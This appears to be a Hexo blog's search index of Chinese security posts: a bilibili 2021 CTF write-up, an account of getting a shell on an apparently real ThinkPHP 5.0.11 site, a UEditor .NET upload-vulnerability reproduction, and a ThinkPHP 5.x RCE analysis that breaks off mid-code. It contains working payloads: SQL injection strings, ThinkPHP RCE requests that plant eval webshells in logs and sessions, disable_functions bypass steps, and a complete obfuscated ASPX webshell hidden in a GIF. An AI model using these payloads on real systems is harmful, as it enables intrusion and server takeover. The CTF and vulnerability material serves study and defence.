<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>bilibili 2021 1024程序员节安全攻防挑战赛</title>
      <link href="posts/47068.html"/>
      <url>posts/47068.html</url>
      
        <content type="html"><![CDATA[<p>赛题地址：<a href="https://www.bilibili.com/blackboard/20211024.html">https://www.bilibili.com/blackboard/20211024.html</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025210203813.png" alt="image-20211025210203813"></p><h1 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025210336274.png" alt="image-20211025210336274"></p><p>AES解密，密码：happy_1024_2233，密文是底下两行字符，需拼成一行（一开始确实没想到是这样！）</p><p>在线解密网站：<a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025210933655.png" alt="image-20211025210933655"></p><h1 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025211100089.png" alt="image-20211025211100089"></p><p>F12，一番寻找下在home.vue中找到藏着的flag</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025211529510.png" alt="image-20211025211529510"></p><h1 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025211611168.png" alt="image-20211025211611168"></p><p>下载压缩包，解压后得到eval.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">        bilibili- ( ゜- ゜)つロ 乾杯~</span></span><br><span class="line"><span class="comment">        uat: http://192.168.3.2/uat/eval.php</span></span><br><span class="line"><span class="comment">        pro: http://security.bilibili.com/sec1024/q/pro/eval.php</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="variable">$args</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (count(<span class="variable">$args</span>) &gt;<span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;count(<span class="variable">$args</span>); <span class="variable">$i</span>++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">&#x27;/^\w+$/&#x27;</span>, <span class="variable">$args</span>[<span class="variable">$i</span>]) ) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// <span class="doctag">todo:</span> other filter</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&quot;/bin/2233 &quot;</span> . implode(<span class="string">&quot; &quot;</span>, <span class="variable">$args</span>);</span><br><span class="line">    exec(<span class="variable">$cmd</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;count(<span class="variable">$out</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$out</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大致思路是由args参数传入命令来找出flag，args数组元素限制在3个以内，且正则匹配<code>/^\w+$/</code>过滤掉了像<code>/</code>、<code>.</code>、这样的特殊字符，args还拼接了<code>/bin/2233</code>，直接传入命令无法正常执行，这个可以用结尾接换行符<code>%0a</code>来绕过，然后就能执行命令了。</p><p>ls 查看当前目录下的文件</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025213016011.png" alt="image-20211025213016011"></p><p>cat passwd 得到flag</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025213132975.png" alt="image-20211025213132975"></p><h1 id="题目4"><a href="#题目4" class="headerlink" title="题目4"></a>题目4</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025213302057.png" alt="image-20211025213302057"></p><p>地址和题目2一样，不过没啥思路。后来得到提示是sql注入，再次F12下找到一个api接口，是以POST提交日志信息的一些参数。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025214345208.png" alt="image-20211025214345208"></p><p>user_name处存在注入点，过滤了空格。</p><p>获取库名，q</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;user_id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;user_name&quot;</span>: <span class="string">&quot;1/**/union/**/select/**/1,2,3,4,database()&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;page&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;size&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025215337254.png" alt="image-20211025215337254"></p><p>获取表名，flag,log,user</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;user_id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;user_name&quot;</span>: <span class="string">&quot;1/**/union/**/select/**/1,2,3,4,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;page&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;size&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025215534341.png" alt="image-20211025215534341"></p><p>获取字段名，id（这里不能使用引号，不然就提前闭合导致错误，可以使用十六进制绕过，flag的十六进制为666c6167，前面加上0x）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;user_id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;user_name&quot;</span>: <span class="string">&quot;1/**/union/**/select/**/1,2,3,4,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;page&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;size&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025220140526.png" alt="image-20211025220140526"></p><p>最后一步，获取flag</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;user_id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;user_name&quot;</span>: <span class="string">&quot;1/**/union/**/select/**/1,2,3,4,group_concat(id)/**/from/**/flag&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;page&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;size&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025220407643.png" alt="image-20211025220407643"></p><h1 id="题目5"><a href="#题目5" class="headerlink" title="题目5"></a>题目5</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025222221427.png" alt="image-20211025222221427"></p><p>下载test.apk，输入账户名和密码提交后提示“还差一点点~~”</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025222638203.png" alt="image-20211025222638203"></p><p>那是不是输入对了就给flag？逐渐忘记题目，这题考的是逆向分析啊~</p><p>以下参考其他师傅解法：</p><p>JADX打开</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025223158463.png" alt="image-20211025223158463"></p><p>Encrypt是加密过程，MainActivity里的两串字符，拿去按Encrypt里的反向操作一次即可。即：一次base64解码，一次异或3，两串可合成一串flag</p><p>解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">obyteArray = [<span class="number">0x59</span>, <span class="number">0x57</span>, <span class="number">0x42</span>, <span class="number">0x6c</span>, <span class="number">0x4f</span>, <span class="number">0x6d</span>, <span class="number">0x5a</span>, <span class="number">0x6e</span>, <span class="number">0x4e</span>, <span class="number">0x6a</span>, <span class="number">0x41</span>, <span class="number">0x75</span>, <span class="number">0x4f</span>, <span class="number">0x6d</span>, <span class="number">0x4a</span>, <span class="number">0x6d</span>, <span class="number">0x4e</span>,</span><br><span class="line">              <span class="number">0x7a</span>,</span><br><span class="line">              <span class="number">0x41</span>, <span class="number">0x78</span>, <span class="number">0x4f</span>, <span class="number">0x32</span>, <span class="number">0x59</span>, <span class="number">0x3d</span>]</span><br><span class="line"> </span><br><span class="line">code = [<span class="number">0x4e</span>, <span class="number">0x6a</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x4f</span>, <span class="number">0x7a</span>, <span class="number">0x41</span>, <span class="number">0x33</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x75</span>, <span class="number">0x4e</span>, <span class="number">0x6a</span>, <span class="number">0x4e</span>, <span class="number">0x6d</span>, <span class="number">0x4e</span>, <span class="number">0x7a</span>,</span><br><span class="line">        <span class="number">0x63</span>, <span class="number">0x37</span>, <span class="number">0x59</span>, <span class="number">0x6d</span>, <span class="number">0x55</span>, <span class="number">0x3d</span>]</span><br><span class="line"> </span><br><span class="line">user = <span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    user+=<span class="built_in">chr</span>(obyteArray[i])</span><br><span class="line">    password+=<span class="built_in">chr</span>(code[i])</span><br><span class="line"> </span><br><span class="line">print(base64.b64decode(user))</span><br><span class="line">print(base64.b64decode(password))</span><br><span class="line"> </span><br><span class="line">a1 = <span class="built_in">str</span>(base64.b64decode(user),encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">a2 = <span class="built_in">str</span>(base64.b64decode(password),encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"> </span><br><span class="line">ans=<span class="string">&quot;&quot;</span></span><br><span class="line">ans1=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    p=<span class="built_in">ord</span>(a1[i1])^<span class="number">3</span></span><br><span class="line">    ans+=<span class="built_in">chr</span>(p)</span><br><span class="line">    p1=<span class="built_in">ord</span>(a2[i1])^<span class="number">3</span></span><br><span class="line">    ans1+=<span class="built_in">chr</span>(p1)</span><br><span class="line"> </span><br><span class="line">print(ans)</span><br><span class="line">print(ans1)</span><br></pre></td></tr></table></figure><h1 id="题目6"><a href="#题目6" class="headerlink" title="题目6"></a>题目6</h1><p>可参考：<a href="https://www.52pojie.cn/thread-1532604-1-1.html">https://www.52pojie.cn/thread-1532604-1-1.html</a></p><h1 id="题目7"><a href="#题目7" class="headerlink" title="题目7"></a>题目7</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211025223534796.png" alt="image-20211025223534796"></p><p>日志分析，需要找出所有的恶意IP，部分答案如下：</p><p>jj.bdc.bbb.cc,dc.bb.ii.jj,cde.ced.bbb.dd,cdd.bcc.bg.bib,cd.bb.cai.cbh,cd.baf.cae.cbc,bfh.ff.dj.jf,bfh.ff.dj.ig,bfh.ff.dj.fb,bfh.ff.dj.bd,bfh.ff.dj.bcf,bbb.bb.bjd.bhf,bbb.bb.bjd.bhc,bbb.bb.bjd.bha,bbb.bb.bjd.bgc,bba.ja.ccb.cbc,bba.ja.cca.beg</p>]]></content>
      
      
      <categories>
          
          <category> 赛题再现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次tp5的艰难getshell</title>
      <link href="posts/18066.html"/>
      <url>posts/18066.html</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>遇到一个站可能存在thinkphp的rce，遂进一步检测，但此过程中碰到诸多限制。通过各种折腾最终艰难地拿下，在此记录一波。</p><h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h1><p>首先得到了thinkphp的版本 V5.0.11</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211008234419257.png" alt="image-20211008234419257"></p><p>然后搜罗了一些针对此版本的exp进行尝试，一番测试下来发现大部分方法都行不通，不过phpinfo可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;captcha</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;call_user_func&amp;get[]&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009000447593.png" alt="image-20211009000447593"></p><p>搜索disable_functions，果然有很多命令执行的函数都被禁止了</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009000540033.png" alt="image-20211009000540033"></p><p>看了一遍发现还有一个漏网之鱼<code>assert</code>函数不在disable_function中，但换用它去结合call_user_func()执行系统命令时仍然失败。</p><p>后来查阅资料得知，在php7.0之后，<code>assert()</code>作为一种语言构造器，而不是一个函数。</p><p>故不满足<code>call_user_func</code>的第一个参数是被调用的回调函数，无法利用。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009004047624.png" alt="image-20211009004047624"></p><p>注意，<code>eval()</code>也是如此，无法作为<code>call_user_func</code>的回调函数。</p><p>下面尝试使用<code>file_put_contents</code>来写shell，但也行不通。后来在其他师傅文章中得知，这里的漏洞利用点只能调用单参数的函数，而这个写文件的函数至少需要两个参数。</p><p><img src="https://www.7ten7.top/images/20200502/003.png" alt="img"></p><h1 id="突破"><a href="#突破" class="headerlink" title="突破"></a>突破</h1><p>根据网上师傅们分享的文章，对tp5的代码执行现有两种思路：</p><ol><li><p>写日志，包含日志getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">写shell进日志</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;call_user_func&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;&lt;?php eval($_POST[&#39;x&#39;])?&gt;</span><br><span class="line"></span><br><span class="line">包含日志文件</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;..&#x2F;runtime&#x2F;log&#x2F;201901&#x2F;21.log&amp;x&#x3D;phpinfo();</span><br></pre></td></tr></table></figure></li><li><p>写session，包含session getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">写 shell 到 session 文件</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;think\Session::set&amp;method&#x3D;get&amp;get[]&#x3D;&lt;?php eval($_POST[&#39;x&#39;])?&gt;&amp;server[]&#x3D;1</span><br><span class="line"></span><br><span class="line">包含 session 文件</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;get[]&#x3D;&#x2F;tmp&#x2F;sess_[sessid]&amp;server[]&#x3D;1</span><br></pre></td></tr></table></figure><p>写日志，前提是需要目标开启了日志功能。</p></li></ol><p>包含日志，前提需要知道日志文件的路径（tp下一般有规律）。</p><p>这次的目标碰巧开启了日志功能，那直接写入，并包含日志文件getshell</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009011032571.png" alt="image-20211009011032571"></p><p>蚁剑连接，需要把POST提交的参数填入请求信息Body处</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009011608712.png" alt="image-20211009011608712"></p><p>写session也一样，然后直接利用文件包含去包含session文件，tp5的session文件一般在/tmp下，文件名为sess_sessionid</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009014309630.png" alt="image-20211009014309630"></p><p>蚁剑成功连接</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009012943615.png" alt="image-20211009012943615"></p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>前面辛苦拿下来webshell，但居然无法执行系统命令？！都是返回ret=127😅</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009014837549.png" alt="image-20211009014837549"></p><p>之后才后知后觉，还是因为disable_functions把执行系统命令的函数给禁用了。</p><p>那怎么才能绕过这一限制呢？已经有师傅对此作了详细总结——<a href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情</a></p><p>在蚁剑中也有相关插件“绕过disable_functions”</p><p>但因为putenv在黑名单中，导致很多绕过方法都无法使用，最终利用PHP7_Backtrace_UAF成功绕过。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009020143149.png" alt="image-20211009020143149"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20211009020634259.png" alt="image-20211009020634259"></p><p>到此，成功getshell</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://www.7ten7.top/2020/05/02/2020-05-02-%E5%AF%B9%E6%9F%90%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E6%AC%A1Getshell/">https://www.7ten7.top/2020/05/02/2020-05-02-%E5%AF%B9%E6%9F%90%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E6%AC%A1Getshell/</a></p><p><a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透初探 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UEditor.net版本任意文件上传到getshell</title>
      <link href="posts/53639.html"/>
      <url>posts/53639.html</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1943028-20200609111825976-1860145670.png"></p><p>UEditor在抓取远程数据源的时，会进入”catchimage”分支。在该方法使用的CrawlerHandler类中，并未对文件类型进行验证，从而导致了任意文件上传漏洞。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>漏洞检测</p><p>访问如下链接 ： <a href="http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage&amp;encode=utf-8">http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage&amp;encode=utf-8</a><br>如出现</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917182153827.png" alt="image-20210917182153827"></p><p>则可尝试漏洞利用</p><p>漏洞POC</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;www.XXXX.com.cn/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>保存其为html文件，action中的url改为检测的链接，打开后上传框输入远程图片马1.gif地址，上传时路径最后改为1.gif?.aspx</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917182836547.png" alt="image-20210917182836547"></p><p>图片马1.gif内容如下（密码为hello）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;script runat&#x3D;&quot;server&quot; language&#x3D;&quot;JScript&quot;&gt;   function popup(str) &#123;       var q &#x3D; &quot;u&quot;;       var w &#x3D; &quot;afe&quot;;       var a &#x3D; q + &quot;ns&quot; + w; var b&#x3D; eval(str,a); return(b);  &#125;&lt;&#x2F;script&gt;&lt;% popup(popup(System.Text.Encoding.GetEncoding(65001). GetString(System.Convert.FromBase64String(&quot;UmVxdWVzdC5JdGVtWyJoZWxsbyJd&quot;)))); %&gt;</span><br></pre></td></tr></table></figure><p>提交后可以看到返回了上传的图片马的地址</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917183134723.png" alt="image-20210917183134723"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917183236500.png" alt="image-20210917183236500"></p><p> 接下来使用菜刀连接即可getshell</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917183609744.png" alt="image-20210917183609744"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210917183728147.png" alt="image-20210917183728147"></p><h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><ol><li>修改工程目录下net/App_Code/CrawlerHandler.cs文件，添加对文件类型检查的代码。</li><li>使用各类WAF软件，防止攻击者上传恶意文件。</li><li>检查文件上传路径下是否有近期上传的畸形图片；检查是否存在asp，aspx等类型危险文件。如果发现异常文件，请判断后及时删除。</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://cert.360.cn/warning/detail?id=15e86d6054f506af058657851a4783c3">https://cert.360.cn/warning/detail?id=15e86d6054f506af058657851a4783c3</a></p><p><a href="https://forum.butian.net/share/167">https://forum.butian.net/share/167</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5.x远程代码执行漏洞分析</title>
      <link href="posts/3948.html"/>
      <url>posts/3948.html</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Thinkphp5.x版本中没有对路由中的控制器进行严格过滤，在存在admin、index模块、没有开启强制路由的条件下（默认不开启），导致可以注入恶意代码利用反射类调用命名空间其他任意内置类，完成远程代码执行。</p><p>影响版本：ThinkPHP v5.0.x &lt; 5.0.23，ThinkPHP v5.1.x &lt; 5.1.31</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先在/thinkphp/library/think/App.php的run()主函数中，url传入后需要经过路由检查</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dispatch</span> = <span class="built_in">self</span>::<span class="variable">$dispatch</span>;</span><br><span class="line">           <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$dispatch</span>)) &#123;</span><br><span class="line">               <span class="variable">$dispatch</span> = <span class="built_in">self</span>::routeCheck(<span class="variable">$request</span>, <span class="variable">$config</span>);</span><br><span class="line">           &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>跟进self::routeCheck函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params"><span class="variable">$request</span>, <span class="keyword">array</span> <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$request</span>-&gt;path();</span><br><span class="line">        ........................</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>进入/thinkphp/library/think/Request.php的path()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">path</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">            <span class="variable">$suffix</span>   = Config::get(<span class="string">&#x27;url_html_suffix&#x27;</span>);</span><br><span class="line">            <span class="variable">$pathinfo</span> = <span class="keyword">$this</span>-&gt;pathinfo();</span><br><span class="line">            ......</span><br></pre></td></tr></table></figure><p>跟进pathinfo()函数，这里进行url解析，获取路由中的各个部分内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 